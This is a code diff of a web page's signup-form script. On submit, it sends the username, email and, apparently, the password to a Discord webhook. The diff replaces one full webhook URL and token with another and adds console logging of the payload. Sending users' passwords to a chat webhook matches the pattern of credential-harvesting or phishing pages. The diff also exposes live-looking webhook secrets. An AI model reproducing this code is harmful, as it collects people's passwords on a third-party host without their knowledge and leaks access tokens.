@@ -27,7 +27,7 @@ document.querySelector("form").addEventListener("submit", function(event) {
 
     if (username && email && password) {
         // Send signup details to Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1315544300697084476/0OMmfzZVGpEkxQXaCJKvSCVqZyAjLiwG3lksybQ_UvFKYtzQBQWsv8KL-ccqTddBSUiw';
+        const webhookUrl = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
         const payload = {
             embeds: [
                 {
@@ -54,6 +54,9 @@ document.querySelector("form").addEventListener("submit", function(event) {
             ]
         };
 
+        // Log the payload for debugging
+        console.log('Sending to webhook with payload:', payload);
+
         fetch(webhookUrl, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -62,5 +65,7 @@ document.querySelector("form").addEventListener("submit", function(event) {
         .then(response => response.json())
         .then(data => console.log('Message sent to Discord:', data))
         .catch(error => console.error('Error sending to Discord:', error));
+    } else {
+        console.error('Form data is incomplete');
     }
 });
